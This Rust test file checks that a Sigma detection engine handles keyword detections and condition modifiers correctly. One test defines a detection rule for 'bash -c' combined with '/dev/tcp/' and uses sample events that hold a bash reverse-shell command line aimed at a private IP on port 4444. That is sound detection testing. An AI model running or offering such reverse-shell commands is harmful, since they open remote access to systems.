//! End-to-end checks that keyword detections and condition selectors follow
//! the Sigma specification.
//!
//! Each test compiles a rule into an [`Engine`] and evaluates it against
//! events, so the candidate index and prefilters take part as they do in
//! production.

use rsigma_eval::{Engine, JsonEvent};
use rsigma_parser::parse_sigma_yaml;
use serde_json::{Value, json};

/// The YAML of a rule whose `detection` block (including its condition) is
/// `detection`.
fn rule_yaml(header: &str, detection: &str) -> String {
    let detection = detection
        .lines()
        .map(|l| format!("  {l}"))
        .collect::<Vec<_>>()
        .join("\n");
    format!("title: t\n{header}logsource: {{category: test}}\ndetection:\n{detection}\n")
}

fn try_engine(yaml: &str) -> Result<Engine, String> {
    let collection = parse_sigma_yaml(yaml).map_err(|e| e.to_string())?;
    if let Some(error) = collection.errors.first() {
        return Err(error.clone());
    }
    let mut engine = Engine::new();
    engine
        .add_collection(&collection)
        .map_err(|e| e.to_string())?;
    Ok(engine)
}

/// Indexes of the events the rule matches.
fn matching(detection: &str, events: &[Value]) -> Vec<usize> {
    matching_rule(&rule_yaml("", detection), events)
}

fn matching_rule(yaml: &str, events: &[Value]) -> Vec<usize> {
    let engine = try_engine(yaml).expect("rule compiles");
    events
        .iter()
        .enumerate()
        .filter(|(_, e)| !engine.evaluate(&JsonEvent::borrow(e)).is_empty())
        .map(|(i, _)| i)
        .collect()
}

#[test]
fn numeric_keywords_match_numbers_and_their_decimal_text() {
    let detection = "keywords:\n  - 4624\ncondition: keywords";
    let events = [
        json!({"EventID": 4624}),
        json!({"Message": "logon 4624 succeeded"}),
        json!({"Nested": {"Codes": [1, 46240]}}),
        json!({"EventID": 4625}),
        json!({"EventID": "4688"}),
    ];
    assert_eq!(matching(detection, &events), vec![0, 1, 2]);

    let detection = "keywords:\n  - 1.5\ncondition: keywords";
    let events = [json!({"Ratio": 1.5}), json!({"Ratio": 2.5})];
    assert_eq!(matching(detection, &events), vec![0]);
}

#[test]
fn keyword_all_requires_every_value_somewhere_in_the_event() {
    let detection = "keywords:\n  '|all':\n    - 'bash -c'\n    - '/dev/tcp/'\ncondition: keywords";
    let events = [
        json!({"CommandLine": "BASH -c 'exec 5<>/dev/tcp/10.0.0.1/4444'"}),
        json!({"Image": "/bin/bash -c", "CommandLine": "cat < /dev/tcp/host/80"}),
        json!({"CommandLine": "bash -c id"}),
        json!({"CommandLine": "/dev/tcp/host/80"}),
    ];
    assert_eq!(matching(detection, &events), vec![0, 1]);
}

#[test]
fn field_less_values_match_as_substrings_of_any_value() {
    let detection = "keywords:\n  '|all':\n    - 'evil'\n    - 4444\ncondition: keywords";
    let events = [
        json!({"Image": "c:\\evil.exe", "Port": 4444}),
        json!({"Image": "c:\\evil.exe", "Port": 44445}),
        json!({"Image": "c:\\good.exe", "Port": 4444}),
    ];
    assert_eq!(matching(detection, &events), vec![0, 1]);

    let detection = "keywords:\n  '|startswith':\n    - 'evil'\ncondition: keywords";
    let events = [
        json!({"Image": "EVIL.exe"}),
        json!({"Image": "c:\\evil.exe"}),
    ];
    assert_eq!(matching(detection, &events), vec![0]);
}

#[test]
fn negated_field_less_values_match_when_no_value_contains_them() {
    let detection = "keywords:\n  '|neq': 'evil'\ncondition: keywords";
    let events = [
        json!({"Image": "c:\\good.exe", "User": "admin"}),
        json!({"Image": "c:\\good.exe", "User": "evil-admin"}),
    ];
    assert_eq!(matching(detection, &events), vec![0]);
}

#[test]
fn field_less_values_in_an_array_body_match_the_member_itself() {
    let yaml = rule_yaml(
        "sigma-version: 3\n",
        "selection:\n  Tags[any]: 'admin'\ncondition: selection",
    );
    let events = [
        json!({"Tags": ["user", "admin"]}),
        json!({"Tags": ["administrators"]}),
    ];
    assert_eq!(matching_rule(&yaml, &events), vec![0]);
}
